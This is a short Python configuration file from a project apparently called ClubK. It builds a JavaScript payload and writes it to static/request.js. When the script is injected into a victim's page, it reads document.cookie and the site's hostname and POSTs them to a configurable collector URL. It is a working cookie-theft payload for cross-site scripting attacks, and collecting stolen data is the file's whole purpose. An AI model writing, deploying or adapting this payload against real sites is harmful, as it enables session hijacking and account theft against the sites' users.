# -*- coding: UTF-8 -*-
# @Project ：ClubK
# @File    ：config.py
# Author   ：0xsdeo
# Date     ：2024/9/28 01:28

HOST = "http://127.0.0.1:5000"

pem = r'ssl/'
key = r'ssl/'

js = """(function () {
    let a = {
        cookie: document.cookie,
        host : window.location.hostname
    }

    let xhr = new XMLHttpRequest;
    xhr.open("post", \"""" + HOST + "/request" + """\");
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify(a))
})()"""

with open("static/request.js","w") as _:
    _.write(js)